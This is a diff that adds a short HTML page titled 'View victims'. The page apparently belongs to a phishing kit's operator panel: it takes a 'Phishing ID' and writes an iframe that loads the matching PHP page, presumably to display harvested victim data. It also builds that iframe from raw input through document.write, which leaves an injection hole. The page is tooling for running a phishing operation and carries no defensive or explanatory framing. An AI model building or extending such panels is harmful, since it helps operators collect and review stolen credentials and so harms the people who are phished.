@@ -1,0 +1,14 @@
+<!doctype html>
+<html><head><title>View victims</title></head>
+<body>
+<input type="text" id="text" placeholder="Phishing ID">
+<button onclick="victims()">View victims</button>
+<script>
+	function victims(){
+		let x=document.getElementById("text");
+		let y= "<iframe style='width:400px;height:700px;' src="+x.value+".php></iframe>";
+		document.write(y);
+		}
+</script>
+</body>
+</html>
